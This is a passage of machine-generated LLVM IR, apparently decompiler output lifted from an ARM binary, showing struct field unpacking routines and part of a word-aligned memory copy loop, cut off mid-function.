  %v1_13c0c = add i32 %v0_13c0c, 77
  %v2_13c0c = inttoptr i32 %v1_13c0c to i8*
  %v3_13c0c = load i8, i8* %v2_13c0c, align 1
  %v4_13c0c = zext i8 %v3_13c0c to i32
  %v1_13c10 = add i32 %v0_13c0c, 76
  %v2_13c10 = inttoptr i32 %v1_13c10 to i8*
  %v3_13c10 = load i8, i8* %v2_13c10, align 1
  %v4_13c10 = zext i8 %v3_13c10 to i32
  store i32 %v4_13c10, i32* %r3.global-to-local, align 4
  %v1_13c14 = add i32 %v0_13c0c, 78
  %v2_13c14 = inttoptr i32 %v1_13c14 to i8*
  %v3_13c14 = load i8, i8* %v2_13c14, align 1
  %v4_13c14 = zext i8 %v3_13c14 to i32
  %v4_13c18 = mul nuw nsw i32 %v4_13c0c, 256
  %v5_13c18 = or i32 %v4_13c10, %v4_13c18
  store i32 %v5_13c18, i32* %r3.global-to-local, align 4
  %v1_13c1c = add i32 %v0_13c0c, 79
  %v2_13c1c = inttoptr i32 %v1_13c1c to i8*
  %v3_13c1c = load i8, i8* %v2_13c1c, align 1
  %v4_13c1c = zext i8 %v3_13c1c to i32
  %v4_13c20 = mul nuw nsw i32 %v4_13c14, 65536
  %v5_13c20 = or i32 %v4_13c20, %v5_13c18
  %v4_13c24 = mul nuw i32 %v4_13c1c, 16777216
  %v5_13c24 = or i32 %v5_13c20, %v4_13c24
  store i32 %v5_13c24, i32* %r3.global-to-local, align 4
  %v1_13c28 = load i32, i32* %r7.global-to-local, align 4
  %v2_13c28 = add i32 %v1_13c28, 76
  %v3_13c28 = inttoptr i32 %v2_13c28 to i32*
  store i32 %v5_13c24, i32* %v3_13c28, align 4
  %v0_13c2c = load i32, i32* %r4.global-to-local, align 4
  %v1_13c2c = add i32 %v0_13c2c, 85
  %v2_13c2c = inttoptr i32 %v1_13c2c to i8*
  %v3_13c2c = load i8, i8* %v2_13c2c, align 1
  %v4_13c2c = zext i8 %v3_13c2c to i32
  %v1_13c30 = add i32 %v0_13c2c, 84
  %v2_13c30 = inttoptr i32 %v1_13c30 to i8*
  %v3_13c30 = load i8, i8* %v2_13c30, align 1
  %v4_13c30 = zext i8 %v3_13c30 to i32
  store i32 %v4_13c30, i32* %r3.global-to-local, align 4
  %v1_13c34 = add i32 %v0_13c2c, 86
  %v2_13c34 = inttoptr i32 %v1_13c34 to i8*
  %v3_13c34 = load i8, i8* %v2_13c34, align 1
  %v4_13c34 = zext i8 %v3_13c34 to i32
  %v4_13c38 = mul nuw nsw i32 %v4_13c2c, 256
  %v5_13c38 = or i32 %v4_13c30, %v4_13c38
  store i32 %v5_13c38, i32* %r3.global-to-local, align 4
  %v1_13c3c = add i32 %v0_13c2c, 87
  %v2_13c3c = inttoptr i32 %v1_13c3c to i8*
  %v3_13c3c = load i8, i8* %v2_13c3c, align 1
  %v4_13c3c = zext i8 %v3_13c3c to i32
  %v4_13c40 = mul nuw nsw i32 %v4_13c34, 65536
  %v5_13c40 = or i32 %v4_13c40, %v5_13c38
  %v4_13c44 = mul nuw i32 %v4_13c3c, 16777216
  %v5_13c44 = or i32 %v5_13c40, %v4_13c44
  store i32 %v5_13c44, i32* %r3.global-to-local, align 4
  %v1_13c48 = load i32, i32* %r7.global-to-local, align 4
  %v2_13c48 = add i32 %v1_13c48, 84
  %v3_13c48 = inttoptr i32 %v2_13c48 to i32*
  store i32 %v5_13c44, i32* %v3_13c48, align 4
  ret i32 %v4_13b4c

; uselistorder directives
  uselistorder i32 %v4_13b4c, { 1, 0 }
  uselistorder i32 %v0_13b40, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v0_13ad0, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v0_13a80, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v0_139a0, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %tmp, { 6, 5, 3, 4, 2, 1, 0, 7 }
  uselistorder i32 87, { 1, 0 }
  uselistorder i32 69, { 1, 0 }
  uselistorder i32 62, { 1, 2, 0 }
  uselistorder i32 61, { 1, 0 }
  uselistorder i32 55, { 2, 4, 0, 3, 1 }
  uselistorder i32 54, { 1, 0 }
  uselistorder i32 53, { 1, 2, 0, 3 }
  uselistorder i32 47, { 1, 2, 3, 4, 0 }
  uselistorder i32 50, { 1, 0 }
  uselistorder i32 39, { 1, 2, 0 }
  uselistorder i32 38, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 34, { 2, 0, 1 }
  uselistorder i32 33, { 2, 3, 0, 1 }
  uselistorder i32 30, { 6, 0, 7, 4, 5, 1, 2, 3 }
  uselistorder i32 29, { 4, 1, 0, 5, 6, 3, 2 }
  uselistorder i32 26, { 7, 0, 1, 3, 9, 2, 8, 4, 10, 5, 11, 6, 12, 13 }
  uselistorder i32 25, { 11, 24, 25, 3, 12, 4, 13, 5, 14, 2, 15, 10, 6, 16, 0, 17, 18, 19, 7, 8, 20, 9, 21, 22, 1, 23 }
  uselistorder i32 23, { 6, 1, 0, 7, 2, 3, 4, 5 }
  uselistorder i32 22, { 10, 1, 12, 2, 3, 4, 5, 0, 11, 6, 13, 7, 14, 8, 15, 9 }
  uselistorder i32 21, { 8, 3, 2, 9, 10, 11, 7, 0, 1, 4, 12, 5, 13, 6, 14 }
  uselistorder i32 19, { 11, 13, 14, 15, 5, 1, 6, 2, 0, 12, 7, 8, 9, 10, 16, 3, 17, 4, 18 }
  uselistorder i32 18, { 9, 10, 11, 12, 8, 0, 1, 2, 3, 13, 4, 14, 5, 15, 6, 16, 7, 17 }
  uselistorder i32 17, { 16, 21, 0, 4, 32, 33, 5, 34, 35, 6, 1, 17, 7, 18, 19, 20, 8, 9, 10, 11, 22, 23, 2, 24, 25, 26, 3, 27, 28, 29, 30, 31, 36, 12, 37, 13, 38, 39, 40, 14, 41, 15 }
  uselistorder i32 6, { 28, 36, 15, 16, 81, 2, 33, 3, 18, 29, 19, 30, 20, 31, 17, 32, 0, 21, 34, 35, 4, 5, 37, 38, 39, 22, 40, 6, 41, 42, 43, 23, 44, 7, 45, 46, 47, 24, 48, 49, 50, 25, 51, 55, 56, 57, 8, 58, 59, 60, 61, 9, 62, 63, 64, 65, 66, 26, 67, 10, 68, 69, 70, 71, 72, 73, 27, 74, 11, 75, 76, 77, 78, 12, 79, 13, 14, 1, 80, 52, 53, 54 }
  uselistorder i32 96, { 1, 0, 2, 3 }
}

define i32 @function_13c54(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13c54:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13c54 = load i32, i32* @r4, align 4
  store i32 %v3_13c54, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v2_13c6c = inttoptr i32 %arg2 to i8*
  %v3_13c6c = call i32 @function_12130(i8* %v2_13c6c, i32 0)
  store i32 %v3_13c6c, i32* %r0.global-to-local, align 4
  %v0_13c70 = load i32, i32* %r5.global-to-local, align 4
  %v1_13c70 = inttoptr i32 %v0_13c70 to i32*
  %v2_13c70 = load i32, i32* %v1_13c70, align 4
  store i32 %v2_13c70, i32* %r3.global-to-local, align 4
  %v1_13c74 = add i32 %v0_13c70, 4
  %v2_13c74 = inttoptr i32 %v1_13c74 to i32*
  %v3_13c74 = load i32, i32* %v2_13c74, align 4
  store i32 %v3_13c74, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_13c7c = load i32, i32* %r6.global-to-local, align 4
  %v1_13c7c = inttoptr i32 %v0_13c7c to i32*
  store i32 %v2_13c70, i32* %v1_13c7c, align 4
  %v3_13c7c = add i32 %v0_13c7c, 4
  %v4_13c7c = inttoptr i32 %v3_13c7c to i32*
  %v5_13c7c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13c7c, i32* %v4_13c7c, align 4
  %v0_13c80 = load i32, i32* %r2.global-to-local, align 4
  %v1_13c80 = load i32, i32* %r6.global-to-local, align 4
  %v2_13c80 = add i32 %v1_13c80, 12
  %v3_13c80 = inttoptr i32 %v2_13c80 to i32*
  store i32 %v0_13c80, i32* %v3_13c80, align 4
  %v0_13c84 = load i32, i32* %r5.global-to-local, align 4
  %v1_13c84 = add i32 %v0_13c84, 9
  %v2_13c84 = inttoptr i32 %v1_13c84 to i8*
  %v3_13c84 = load i8, i8* %v2_13c84, align 1
  %v4_13c84 = zext i8 %v3_13c84 to i32
  store i32 %v4_13c84, i32* %r2.global-to-local, align 4
  %v1_13c88 = add i32 %v0_13c84, 8
  %v2_13c88 = inttoptr i32 %v1_13c88 to i8*
  %v3_13c88 = load i8, i8* %v2_13c88, align 1
  %v4_13c88 = zext i8 %v3_13c88 to i32
  %v4_13c8c = mul nuw nsw i32 %v4_13c84, 256
  %v5_13c8c = or i32 %v4_13c88, %v4_13c8c
  store i32 %v5_13c8c, i32* %r3.global-to-local, align 4
  %v1_13c90 = load i32, i32* %r6.global-to-local, align 4
  %v2_13c90 = add i32 %v1_13c90, 16
  %v3_13c90 = inttoptr i32 %v2_13c90 to i32*
  store i32 %v5_13c8c, i32* %v3_13c90, align 4
  %v0_13c94 = load i32, i32* %r5.global-to-local, align 4
  %v1_13c94 = add i32 %v0_13c94, 11
  %v2_13c94 = inttoptr i32 %v1_13c94 to i8*
  %v3_13c94 = load i8, i8* %v2_13c94, align 1
  %v4_13c94 = zext i8 %v3_13c94 to i32
  store i32 %v4_13c94, i32* %r2.global-to-local, align 4
  %v1_13c98 = add i32 %v0_13c94, 10
  %v2_13c98 = inttoptr i32 %v1_13c98 to i8*
  %v3_13c98 = load i8, i8* %v2_13c98, align 1
  %v4_13c98 = zext i8 %v3_13c98 to i32
  %v4_13c9c = mul nuw nsw i32 %v4_13c94, 256
  %v5_13c9c = or i32 %v4_13c98, %v4_13c9c
  store i32 %v5_13c9c, i32* %r3.global-to-local, align 4
  %v1_13ca0 = load i32, i32* %r6.global-to-local, align 4
  %v2_13ca0 = add i32 %v1_13ca0, 20
  %v3_13ca0 = inttoptr i32 %v2_13ca0 to i32*
  store i32 %v5_13c9c, i32* %v3_13ca0, align 4
  %v0_13ca4 = load i32, i32* %r5.global-to-local, align 4
  %v1_13ca4 = add i32 %v0_13ca4, 13
  %v2_13ca4 = inttoptr i32 %v1_13ca4 to i8*
  %v3_13ca4 = load i8, i8* %v2_13ca4, align 1
  %v4_13ca4 = zext i8 %v3_13ca4 to i32
  store i32 %v4_13ca4, i32* %r2.global-to-local, align 4
  %v1_13ca8 = add i32 %v0_13ca4, 12
  %v2_13ca8 = inttoptr i32 %v1_13ca8 to i8*
  %v3_13ca8 = load i8, i8* %v2_13ca8, align 1
  %v4_13ca8 = zext i8 %v3_13ca8 to i32
  %v4_13cac = mul nuw nsw i32 %v4_13ca4, 256
  %v5_13cac = or i32 %v4_13ca8, %v4_13cac
  store i32 %v5_13cac, i32* %r3.global-to-local, align 4
  %v1_13cb0 = load i32, i32* %r6.global-to-local, align 4
  %v2_13cb0 = add i32 %v1_13cb0, 24
  %v3_13cb0 = inttoptr i32 %v2_13cb0 to i32*
  store i32 %v5_13cac, i32* %v3_13cb0, align 4
  %v0_13cb4 = load i32, i32* %r5.global-to-local, align 4
  %v1_13cb4 = add i32 %v0_13cb4, 20
  %v2_13cb4 = inttoptr i32 %v1_13cb4 to i32*
  %v3_13cb4 = load i32, i32* %v2_13cb4, align 4
  store i32 %v3_13cb4, i32* %r3.global-to-local, align 4
  %v1_13cb8 = add i32 %v0_13cb4, 14
  %v2_13cb8 = inttoptr i32 %v1_13cb8 to i8*
  %v3_13cb8 = load i8, i8* %v2_13cb8, align 1
  %v4_13cb8 = zext i8 %v3_13cb8 to i32
  store i32 %v4_13cb8, i32* %r0.global-to-local, align 4
  %v1_13cbc = add i32 %v0_13cb4, 15
  %v2_13cbc = inttoptr i32 %v1_13cbc to i8*
  %v3_13cbc = load i8, i8* %v2_13cbc, align 1
  %v4_13cbc = zext i8 %v3_13cbc to i32
  store i32 %v4_13cbc, i32* %ip.global-to-local, align 4
  %v1_13cc0 = add i32 %v0_13cb4, 16
  %v2_13cc0 = inttoptr i32 %v1_13cc0 to i32*
  %v3_13cc0 = load i32, i32* %v2_13cc0, align 4
  store i32 %v3_13cc0, i32* %r1.global-to-local, align 4
  %v1_13cc4 = load i32, i32* %r6.global-to-local, align 4
  %v2_13cc4 = add i32 %v1_13cc4, 44
  %v3_13cc4 = inttoptr i32 %v2_13cc4 to i32*
  store i32 %v3_13cb4, i32* %v3_13cc4, align 4
  %v0_13cc8 = load i32, i32* %r5.global-to-local, align 4
  %v1_13cc8 = add i32 %v0_13cc8, 24
  %v2_13cc8 = inttoptr i32 %v1_13cc8 to i32*
  %v3_13cc8 = load i32, i32* %v2_13cc8, align 4
  store i32 %v3_13cc8, i32* %r3.global-to-local, align 4
  %v1_13ccc = load i32, i32* %r6.global-to-local, align 4
  %v2_13ccc = add i32 %v1_13ccc, 48
  %v3_13ccc = inttoptr i32 %v2_13ccc to i32*
  store i32 %v3_13cc8, i32* %v3_13ccc, align 4
  %v0_13cd0 = load i32, i32* %r5.global-to-local, align 4
  %v1_13cd0 = add i32 %v0_13cd0, 28
  %v2_13cd0 = inttoptr i32 %v1_13cd0 to i32*
  %v3_13cd0 = load i32, i32* %v2_13cd0, align 4
  store i32 %v3_13cd0, i32* %r3.global-to-local, align 4
  %v1_13cd4 = load i32, i32* %r6.global-to-local, align 4
  %v2_13cd4 = add i32 %v1_13cd4, 52
  %v3_13cd4 = inttoptr i32 %v2_13cd4 to i32*
  store i32 %v3_13cd0, i32* %v3_13cd4, align 4
  %v0_13cd8 = load i32, i32* %r5.global-to-local, align 4
  %v1_13cd8 = add i32 %v0_13cd8, 32
  %v2_13cd8 = inttoptr i32 %v1_13cd8 to i32*
  %v3_13cd8 = load i32, i32* %v2_13cd8, align 4
  store i32 %v3_13cd8, i32* %r3.global-to-local, align 4
  %v1_13cdc = load i32, i32* %r6.global-to-local, align 4
  %v2_13cdc = add i32 %v1_13cdc, 56
  %v3_13cdc = inttoptr i32 %v2_13cdc to i32*
  store i32 %v3_13cd8, i32* %v3_13cdc, align 4
  %v0_13ce0 = load i32, i32* %r5.global-to-local, align 4
  %v1_13ce0 = add i32 %v0_13ce0, 40
  %v2_13ce0 = inttoptr i32 %v1_13ce0 to i32*
  %v3_13ce0 = load i32, i32* %v2_13ce0, align 4
  store i32 %v3_13ce0, i32* %r3.global-to-local, align 4
  %v1_13ce4 = load i32, i32* %r6.global-to-local, align 4
  %v2_13ce4 = add i32 %v1_13ce4, 64
  %v3_13ce4 = inttoptr i32 %v2_13ce4 to i32*
  store i32 %v3_13ce0, i32* %v3_13ce4, align 4
  %v0_13ce8 = load i32, i32* %r5.global-to-local, align 4
  %v1_13ce8 = add i32 %v0_13ce8, 48
  %v2_13ce8 = inttoptr i32 %v1_13ce8 to i32*
  %v3_13ce8 = load i32, i32* %v2_13ce8, align 4
  store i32 %v3_13ce8, i32* %r3.global-to-local, align 4
  %v1_13cec = load i32, i32* %r6.global-to-local, align 4
  %v2_13cec = add i32 %v1_13cec, 72
  %v3_13cec = inttoptr i32 %v2_13cec to i32*
  store i32 %v3_13ce8, i32* %v3_13cec, align 4
  %v0_13cf0 = load i32, i32* %r5.global-to-local, align 4
  %v1_13cf0 = add i32 %v0_13cf0, 36
  %v2_13cf0 = inttoptr i32 %v1_13cf0 to i32*
  %v3_13cf0 = load i32, i32* %v2_13cf0, align 4
  store i32 %v3_13cf0, i32* %r3.global-to-local, align 4
  %v1_13cf4 = load i32, i32* %r6.global-to-local, align 4
  %v2_13cf4 = add i32 %v1_13cf4, 60
  %v3_13cf4 = inttoptr i32 %v2_13cf4 to i32*
  store i32 %v3_13cf0, i32* %v3_13cf4, align 4
  %v0_13cf8 = load i32, i32* %r5.global-to-local, align 4
  %v1_13cf8 = add i32 %v0_13cf8, 44
  %v2_13cf8 = inttoptr i32 %v1_13cf8 to i32*
  %v3_13cf8 = load i32, i32* %v2_13cf8, align 4
  store i32 %v3_13cf8, i32* %r3.global-to-local, align 4
  %v0_13cfc = load i32, i32* %r0.global-to-local, align 4
  %v1_13cfc = load i32, i32* %ip.global-to-local, align 4
  %v4_13cfc = mul i32 %v1_13cfc, 256
  %v5_13cfc = or i32 %v4_13cfc, %v0_13cfc
  store i32 %v5_13cfc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_13d04 = load i32, i32* %r6.global-to-local, align 4
  %v2_13d04 = add i32 %v1_13d04, 28
  %v3_13d04 = inttoptr i32 %v2_13d04 to i32*
  store i32 %v5_13cfc, i32* %v3_13d04, align 4
  %v0_13d08 = load i32, i32* %r1.global-to-local, align 4
  %v1_13d08 = load i32, i32* %r6.global-to-local, align 4
  %v2_13d08 = add i32 %v1_13d08, 32
  %v3_13d08 = inttoptr i32 %v2_13d08 to i32*
  store i32 %v0_13d08, i32* %v3_13d08, align 4
  %v0_13d0c = load i32, i32* %r2.global-to-local, align 4
  %v1_13d0c = load i32, i32* %r6.global-to-local, align 4
  %v2_13d0c = add i32 %v1_13d0c, 36
  %v3_13d0c = inttoptr i32 %v2_13d0c to i32*
  store i32 %v0_13d0c, i32* %v3_13d0c, align 4
  %v0_13d10 = load i32, i32* %r3.global-to-local, align 4
  %v1_13d10 = load i32, i32* %r6.global-to-local, align 4
  %v2_13d10 = add i32 %v1_13d10, 68
  %v3_13d10 = inttoptr i32 %v2_13d10 to i32*
  store i32 %v0_13d10, i32* %v3_13d10, align 4
  %v0_13d14 = load i32, i32* %r5.global-to-local, align 4
  %v1_13d14 = add i32 %v0_13d14, 52
  %v2_13d14 = inttoptr i32 %v1_13d14 to i32*
  %v3_13d14 = load i32, i32* %v2_13d14, align 4
  store i32 %v3_13d14, i32* %r3.global-to-local, align 4
  %v1_13d18 = load i32, i32* %r6.global-to-local, align 4
  %v2_13d18 = add i32 %v1_13d18, 76
  %v3_13d18 = inttoptr i32 %v2_13d18 to i32*
  store i32 %v3_13d14, i32* %v3_13d18, align 4
  %v2_13d1c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13d1c, i32* %r4.global-to-local, align 4
  ret i32 %v5_13cfc

; uselistorder directives
  uselistorder i32 %v0_13cb4, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 11, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32 76, { 2, 0, 1 }
  uselistorder i32 68, { 2, 0, 1 }
  uselistorder i32 60, { 3, 1, 2, 0, 4 }
  uselistorder i32 72, { 2, 0, 1 }
  uselistorder i32 64, { 15, 11, 12, 0, 8, 47, 13, 14, 16, 17, 9, 18, 19, 20, 1, 21, 22, 23, 2, 24, 25, 26, 3, 27, 28, 29, 10, 30, 31, 32, 4, 33, 34, 35, 36, 37, 5, 38, 39, 40, 41, 42, 6, 43, 44, 45, 7, 46 }
  uselistorder i32 56, { 3, 0, 1, 2, 4 }
  uselistorder i32 52, { 2, 3, 0, 1, 4, 5, 6 }
  uselistorder i32 15, { 18, 14, 13, 15, 2, 16, 3, 17, 4, 5, 6, 7, 8, 9, 10, 11, 19, 20, 12, 21, 22, 23, 24, 0, 25, 26, 27, 28, 1, 29 }
  uselistorder i32 14, { 21, 18, 33, 0, 19, 1, 17, 4, 20, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 22, 23, 16, 24, 25, 26, 27, 2, 28, 29, 30, 31, 3, 32 }
  uselistorder i32 13, { 30, 24, 23, 25, 26, 27, 28, 29, 0, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 2, 14, 15, 16, 17, 18, 19, 20, 31, 32, 33, 34, 35, 21, 36, 37, 38, 39, 40, 41, 42, 43, 22, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 3, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 4, 72, 73 }
  uselistorder i32 9, { 44, 45, 46, 8, 5, 47, 9, 6, 32, 24, 11, 31, 12, 27, 13, 28, 14, 29, 15, 30, 10, 3, 33, 25, 34, 2, 26, 16, 35, 17, 36, 18, 37, 38, 39, 40, 19, 41, 20, 42, 21, 43, 0, 22, 1, 60, 48, 49, 50, 51, 52, 53, 7, 54, 55, 56, 57, 58, 59, 61, 62, 4, 63, 23 }
  uselistorder i32 (i8*, i32)* @function_12130, { 2, 0, 7, 6, 1, 3, 4, 5 }
  uselistorder i32 88, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
}

define i32 @function_13d20() local_unnamed_addr {
dec_label_pc_13d20:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_13d20 = load i32, i32* @r1, align 4
  %v1_13d20 = load i32, i32* @r0, align 4
  %v2_13d20 = sub i32 %v0_13d20, %v1_13d20
  %v3_13d20 = icmp ult i32 %v0_13d20, %v1_13d20
  %v4_13d20 = xor i32 %v1_13d20, %v0_13d20
  %v5_13d20 = xor i32 %v2_13d20, %v0_13d20
  %v6_13d20 = and i32 %v5_13d20, %v4_13d20
  %v7_13d20 = icmp slt i32 %v6_13d20, 0
  store i1 %v7_13d20, i1* %cpsr_v.global-to-local, align 1
  %v8_13d20 = icmp slt i32 %v2_13d20, 0
  store i1 %v8_13d20, i1* %cpsr_n.global-to-local, align 1
  %v9_13d20 = icmp eq i32 %v0_13d20, %v1_13d20
  store i1 %v9_13d20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13d20, label %dec_label_pc_13f6c, label %dec_label_pc_13d28

dec_label_pc_13d28:                               ; preds = %dec_label_pc_13d20
  br i1 %v9_13d20, label %.thread122, label %bb

.thread122:                                       ; preds = %bb144, %.thread121, %bb141, %dec_label_pc_13d28
  %merge = phi i32 [ %v0_13d20, %dec_label_pc_13d28 ], [ %v2_14000, %bb141 ], [ %v11_1401c, %bb144 ], [ %v7_1401c, %.thread121 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_13d28
  store i32 %v1_13d20, i32* %stack_var_-8, align 4
  %v0_13d30 = load i32, i32* @r2, align 4
  %v2_13d30 = add i32 %v0_13d30, -4
  store i32 %v2_13d30, i32* %r2.global-to-local, align 4
  %v4_13d30 = sub i32 3, %v0_13d30
  %v5_13d30 = and i32 %v4_13d30, %v0_13d30
  %v6_13d30 = icmp slt i32 %v5_13d30, 0
  store i1 %v6_13d30, i1* %cpsr_v.global-to-local, align 1
  %v7_13d30 = icmp slt i32 %v2_13d30, 0
  store i1 %v7_13d30, i1* %cpsr_n.global-to-local, align 1
  %v8_13d30 = icmp eq i32 %v0_13d30, 4
  store i1 %v8_13d30, i1* %cpsr_z.global-to-local, align 1
  %v5_13d34 = icmp slt i32 %v0_13d30, 4
  br i1 %v5_13d34, label %bb131, label %dec_label_pc_13d38

dec_label_pc_13d38:                               ; preds = %bb
  %v1_13d38 = urem i32 %v1_13d20, 4
  store i32 %v1_13d38, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_13d38 = icmp eq i32 %v1_13d38, 0
  store i1 %v2_13d38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13d38, label %dec_label_pc_13d40, label %dec_label_pc_13de4

dec_label_pc_13d40:                               ; preds = %dec_label_pc_13d38
  %v1_13d40 = urem i32 %v0_13d20, 4
  store i32 %v1_13d40, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_13d40 = icmp eq i32 %v1_13d40, 0
  store i1 %v2_13d40, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_13d20 to i2
  br i1 %v2_13d40, label %dec_label_pc_13d48, label %dec_label_pc_13e14

dec_label_pc_13d48:                               ; preds = %dec_label_pc_13d40, %dec_label_pc_13e0c
  %v0_13d6092 = phi i32 [ %v1_13d20, %dec_label_pc_13d40 ], [ %v0_13e5c75, %dec_label_pc_13e0c ]
  %v0_13d5c91 = phi i32 [ %v0_13d20, %dec_label_pc_13d40 ], [ %v0_13e0c, %dec_label_pc_13e0c ]
  %v0_13d48 = phi i32 [ %v2_13d30, %dec_label_pc_13d40 ], [ %v2_13e04, %dec_label_pc_13e0c ]
  %v2_13d48 = add i32 %v0_13d48, -8
  store i32 %v2_13d48, i32* %r2.global-to-local, align 4
  %v4_13d48 = sub i32 7, %v0_13d48
  %v5_13d48 = and i32 %v4_13d48, %v0_13d48
  %v6_13d48 = icmp slt i32 %v5_13d48, 0
  store i1 %v6_13d48, i1* %cpsr_v.global-to-local, align 1
  %v7_13d48 = icmp slt i32 %v2_13d48, 0
  store i1 %v7_13d48, i1* %cpsr_n.global-to-local, align 1
  %v8_13d48 = icmp eq i32 %v0_13d48, 8
  store i1 %v8_13d48, i1* %cpsr_z.global-to-local, align 1
  %v5_13d4c = icmp slt i32 %v0_13d48, 8
  br i1 %v5_13d4c, label %dec_label_pc_13d9c, label %dec_label_pc_13d50

dec_label_pc_13d50:                               ; preds = %dec_label_pc_13d48
  %v2_13d50 = add i32 %v0_13d48, -28
  store i32 %v2_13d50, i32* %r2.global-to-local, align 4
  %v4_13d50 = sub i32 27, %v0_13d48
  %v5_13d50 = and i32 %v4_13d50, %v2_13d48
  %v6_13d50 = icmp slt i32 %v5_13d50, 0
  store i1 %v6_13d50, i1* %cpsr_v.global-to-local, align 1
  %v7_13d50 = icmp slt i32 %v2_13d50, 0
  store i1 %v7_13d50, i1* %cpsr_n.global-to-local, align 1
  %v8_13d50 = icmp eq i32 %v2_13d48, 20
  store i1 %v8_13d50, i1* %cpsr_z.global-to-local, align 1
  %v5_13d54 = icmp slt i32 %v2_13d48, 20
  br i1 %v5_13d54, label %dec_label_pc_13d88, label %dec_label_pc_13d58

dec_label_pc_13d58:                               ; preds = %dec_label_pc_13d50
  %v0_13d58 = load i32, i32* @r4, align 4
  store i32 %v0_13d58, i32* %stack_var_-12, align 4
  br label %dec_label_pc_13d5c

dec_label_pc_13d5c:                               ; preds = %dec_label_pc_13d5c.dec_label_pc_13d5c_crit_edge, %dec_label_pc_13d58
  %v0_13d60 = phi i32 [ %v12_13d68, %dec_label_pc_13d5c.dec_label_pc_13d5c_crit_edge ], [ %v0_13d6092, %dec_label_pc_13d58 ]
  %v0_13d5c = phi i32 [ %v0_13d5c.pre, %dec_label_pc_13d5c.dec_label_pc_13d5c_crit_edge ], [ %v0_13d5c91, %dec_label_pc_13d58 ]
  %v1_13d5c = inttoptr i32 %v0_13d5c to i32*
  %v2_13d5c = load i32, i32* %v1_13d5c, align 4
  store i32 %v2_13d5c, i32* %r3.global-to-local, align 4
  %v3_13d5c = add i32 %v0_13d5c, 4
  %v4_13d5c = inttoptr i32 %v3_13d5c to i32*
  %v5_13d5c = load i32, i32* %v4_13d5c, align 4
  store i32 %v5_13d5c, i32* %r4.global-to-local, align 4
  %v6_13d5c = add i32 %v0_13d5c, 8
  %v7_13d5c = inttoptr i32 %v6_13d5c to i32*
  %v8_13d5c = load i32, i32* %v7_13d5c, align 4
  store i32 %v8_13d5c, i32* %ip.global-to-local, align 4
  %v9_13d5c = add i32 %v0_13d5c, 12
  %v10_13d5c = inttoptr i32 %v9_13d5c to i32*
  %v11_13d5c = load i32, i32* %v10_13d5c, align 4
  store i32 %v11_13d5c, i32* %lr.global-to-local, align 4
  %v12_13d5c = add i32 %v0_13d5c, 16
  store i32 %v12_13d5c, i32* %r1.global-to-local, align 4
  %v1_13d60 = inttoptr i32 %v0_13d60 to i32*
  store i32 %v2_13d5c, i32* %v1_13d60, align 4
  %v3_13d60 = add i32 %v0_13d60, 4
  %v4_13d60 = inttoptr i32 %v3_13d60 to i32*
  %v5_13d60 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13d60, i32* %v4_13d60, align 4
  %v6_13d60 = add i32 %v0_13d60, 8
  %v7_13d60 = inttoptr i32 %v6_13d60 to i32*
  %v8_13d60 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_13d60, i32* %v7_13d60, align 4
  %v9_13d60 = add i32 %v0_13d60, 12
  %v10_13d60 = inttoptr i32 %v9_13d60 to i32*
  %v11_13d60 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_13d60, i32* %v10_13d60, align 4
  %v12_13d60 = add i32 %v0_13d60, 16
